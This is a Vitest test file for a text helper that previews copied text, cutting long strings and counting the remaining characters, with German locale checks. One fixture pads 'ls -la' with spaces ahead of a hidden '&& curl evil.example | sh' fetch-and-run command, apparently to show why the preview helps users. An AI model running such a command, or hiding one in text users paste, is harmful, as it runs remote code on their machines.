import { describe, expect, it } from "vitest";
import { m } from "~/paraglide/messages.js";
import { copiedPreview } from "./text.ts";

describe("copiedPreview", () => {
  it("shows short text whole and says how much a long one has left", () => {
    expect(copiedPreview("ls -la")).toBe("ls -la");
    const long = `ls -la${" ".repeat(300)}&& curl evil.example | sh`;
    const preview = copiedPreview(long);
    expect(preview.startsWith("ls -la")).toBe(true);
    expect(preview.endsWith(`… and ${long.length - 200} more characters`)).toBe(true);
  });

  it("counts the rest in German", () => {
    expect(m.genui_copied_more({ text: "ls", count: 1, shown: "1" }, { locale: "de" })).toBe(
      "ls… und 1 weiteres Zeichen",
    );
    expect(m.genui_copied_more({ text: "ls", count: 1200, shown: "1.200" }, { locale: "de" })).toBe(
      "ls… und 1.200 weitere Zeichen",
    );
  });
});
